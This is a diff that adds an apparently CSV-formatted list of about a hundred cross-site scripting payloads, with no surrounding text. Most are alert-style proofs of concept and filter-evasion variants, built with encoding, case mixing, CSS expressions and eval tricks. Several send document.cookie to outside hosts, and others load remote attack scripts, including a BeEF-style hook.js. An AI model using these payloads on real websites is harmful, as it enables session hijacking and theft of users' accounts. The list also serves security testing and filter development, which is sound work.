@@ -1,0 +1,108 @@
+<script>alert(123)</script>
+<script>console.log(alert(555))</script>
+console.log(alert(555))
+<script>alert('xss')</script>
+<script>confirm('xss')</script>
+<script>prompt('xss')</script>
+"<script>document.write('console.log(alert(""xss""))')</script>"
+"<script>document.write('<script>console.log(alert(""xss""))</script>');</script>"
+"<script>document.write('<script>console.log((alert(""xss""), ""ccc""))</script>');</script>"
+"<script>document.write('<script>console.log((alert(""xss""), document.cookie))</script>');</script>"
+<script>document.write('<script>alert(1)</script>')</script>
+<script>console.log(alert('xss'))</script>
+<script>console.error(1)</script>
+"<script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script>"
+<script>alert('sss')</script>
+"<input type=""submit"" value=""xx"" onclick=javascript:alert('xss')>"
+"<input type=""text"" value=""xx"" onkeydown=javascript:alert('xss')>"
+"<img src=""""> onclick=javascript:alert('xss')>"
+"<img src="" "" onload=javascript:alert('xss')>"
+"<img src="" "" onmouseover=javascript:alert('xss')>"
+<a href=javascript:alert('xss')>sss</a>
+<imgsrc=1onerror='prompt(document.cookie)'>
+<svg/onload=alert(1)>
+<svgonload=confirm(1)>
+"<a href=""javascript:alert('hello')"">"
+"<iframe src=""javascript:alert('hello')"">"
+"<img src='x' onerror=""alert('hello')"">"
+"<video src='x' onerror=""alert('hello')""> </video>"
+"<div onclick=""alert('hello')"" onmouseover=""alert('hello2')""> </div>"
+"<iframe src = ""data:text/html;base64,PHNjcmldwD5kb2N1bWvudC53cmL0ZSgnPHNjcmldwD5jb25mcmLtKD EpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg = ""></iframe>"
+"<a href = ""data:text/plain;base64,PHNjcmldwD5kb2N1bWvudC53cmL0ZSgnPHNjcmldwD5jb25mcmLtKD EpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg = "">111"
+"<object data = ""data:text/plain;base64,PHNjcmldwD5kb2N1bWvudC53cmL0ZSgnPHNjcmldwD5jb25mcmLtKD EpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg = ""></object>"
+Function(alert('1'))( 'Function(alert('1'))(
+<button onclick=alert(1)>11
+"1' onclick=""alert('xss')"">"
+"'><img src=1onerror=""alert('xss')"">"
+"<script>new Image().src=""http://192.168.52.206/?co=""+document.cookie;</script>"
+"<script>document.location=""http://127.0.0.1/a.php?cookie=""+document.cookie+"" </script>"
+"img.src=""http://127.0.0.1:4444/a.php?cookie=""+document.cookie;"
+"<script>getElementbyclassname(""xsss_title"").innerHTML = ""Webshell"";</script>"
+"<script>alert('hello, gaga!');</script>"
+"""""><img src=""javascript:alert('xss')"">"
+"""""><script>alert('xss')</script>"
+"<table background=""javascript:alert([code])""></table>"
+"<object type=text/html data=""javascript:alert([code]);""></object>"
+"""+alert('xss')+"""
+'><script>alert(document.cookie)</script>
+='><script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+<script>alert(vulnerable)</script>
+<script>alert('XSS')</script>
+<img src=javascript:alert('XSS')>
+"%0a%0a<script>alert(""Vulnerable"")</script>.jsp"
+%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
+%3cscript%3ealert(%22xss%22)%3c/script%3e
+<script>alert('Vulnerable')</script>
+a.jsp<script>alert('Vulnerable')</script>
+"""><script>alert('Vulnerable')</script>"
+"<IMG SRC=""javascript:alert('XSS');"">"
+"<IMG src=""/javascript:alert('XSS')"">"
+"<IMG src=""/JaVaScRiPt:alert('XSS')"">"
+"<IMG src=""/JaVaScRiPt:alert(&quot;XSS&quot;);"">"
+"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">"
+"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">"
+"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
+"""<IMG src=""/java\0script:alert(""XSS"");"">'out"
+"<IMG SRC="" javascript:alert('XSS');"">"
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+"<BODY BACKGROUND=""javascript:alert('XSS')"">"
+<BODY ONLOAD=alert('XSS')>
+"<IMG DYNSRC=""javascript:alert('XSS')"">"
+"<IMG LOWSRC=""javascript:alert('XSS')"">"
+"<BGSOUND SRC=""javascript:alert('XSS');"">"
+"<br size=""&{alert('XSS')}"">"
+"<LAYER SRC=""http://xss.ha.ckers.org/a.js""></layer>"
+"<LINK REL=""stylesheet""HREF=""javascript:alert('XSS');"">"
+"<IMG SRC='vbscript:msgbox(""XSS"")'>"
+"<META HTTP-EQUIV=""refresh""CONTENT=""0;url=javascript:alert('XSS');"">"
+"<IFRAME. src=""/javascript:alert('XSS')""></IFRAME>"
+"<FRAMESET><FRAME. src=""/javascript:alert('XSS')""></FRAME></FRAMESET>"
+"<TABLE BACKGROUND=""javascript:alert('XSS')"">"
+"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">"
+"<DIV STYLE=""behaviour: url('http://www.how-to-hack.org/exploit.html&#39;);"">"
+"<DIV STYLE=""width: expression(alert('XSS'));"">"
+"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"");</STYLE>"
+"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
+"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>"
+"<STYLE TYPE=""text/css"">.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>"
+"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>"
+"<BASE HREF=""javascript:alert('XSS');//"">"
+"getURL(""javascript:alert('XSS')"")"
+"a=""get"";b=""URL"";c=""javascript:"";d=""alert('XSS');"";eval(a+b+c+d);"
+"<XML SRC=""javascript:alert('XSS');"">"
+"""> <BODY ONLOAD=""a();""><SCRIPT>function a(){alert('XSS');}</SCRIPT>"
+"<SCRIPT SRC=""http://xss.ha.ckers.org/xss.jpg""></SCRIPT>"
+"<Img src='#' Onerror=""alert(/xss/)"">"
+"<a href=""javascript:alert(/xss/)"">click me</a>"
+<img src='#' onerror='alert(/xss/)'>
+<img src=# onerror=alert(/xss/)>
+<Img src='#'/Onerror='alert(/xss/)'>
+"<A href=""j avas script:alert(/xss/)"">click me!</a>"
+<script>z='alert'</script>
+"<A href=""j6#97;v6#x61;script:alert(/xss/)"">click me!</a>"
+<script>z=z+'(/xss/)'</script>
+<script>eval(z)</script>
+"<script src=""http://<IP>:3000/hook.js""></script>"
+"<script src=""http://127.0.0.1:3000/hook.js""></script>"
